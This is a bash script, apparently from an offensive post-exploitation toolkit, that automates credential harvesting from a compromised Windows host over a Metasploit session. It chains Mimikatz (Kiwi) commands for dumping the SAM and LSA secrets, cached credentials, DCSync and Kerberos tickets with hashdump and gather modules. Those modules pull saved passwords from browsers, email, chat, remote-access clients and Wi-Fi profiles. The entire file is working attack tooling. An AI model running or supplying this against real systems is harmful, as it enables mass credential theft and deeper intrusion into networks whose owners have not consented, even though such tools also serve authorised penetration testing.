#!/usr/bin/env bash
# ==============================================================================
# WINDOWS HARVEST ALL — Complete credential harvesting
# Usage: bash harvest_all.sh <SESSION_ID>
# ==============================================================================
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/../../../lib/common.sh" 2>/dev/null || true
source "$SCRIPT_DIR/../../../lib/env.sh" 2>/dev/null || true
SESSION="${1:-}"
[[ -z "$SESSION" ]] && { echo "Usage: bash harvest_all.sh <SESSION_ID>"; exit 1; }
IN_MSF=false; [[ "${MSF_CONSOLE:-}" == "1" ]] || [[ -n "${MSFCONSOLE_BIN:-}" ]] && IN_MSF=true
run_msf() { local m="$1"; shift; local c="use $m"; for a in "$@"; do c="$c; set $a"; done; c="$c; run"; echo "$c"; }
echo ""; echo "=== HARVEST ALL — Session: $SESSION ==="; echo ""
echo -e "--- ${RED}Kiwi / Mimikatz${NC} ---"
$IN_MSF && run_msf "post/windows/manage/load_kiwi" "SESSION $SESSION" || echo "meterpreter -x 'load kiwi'"
for kiwi in creds_all lsa_dump_sam lsa_dump_secrets lsa_dump_cache dcsync kerberos_ticket_list; do
    $IN_MSF && run_msf "post/windows/manage/$kiwi" "SESSION $SESSION" || echo "meterpreter -x '$kiwi'"
done
echo ""
echo -e "--- ${RED}Post Module Harvest${NC} ---"
for mod in hashdump credential_collector enum_chrome enum_firefox enum_ie enum_putty enum_citrix enum_outlook enum_skype enum_teams enum_vnc enum_ftp enum_rdp wifi_profiles_passwords; do
    $IN_MSF && run_msf "post/windows/gather/$mod" "SESSION $SESSION" || echo "use post/windows/gather/$mod; set SESSION $SESSION"
done
echo ""
echo -e "--- ${BLUE}System Creds${NC} ---"
$IN_MSF && run_msf "post/windows/gather/hashdump" "SESSION $SESSION" || echo "meterpreter -x 'hashdump'"
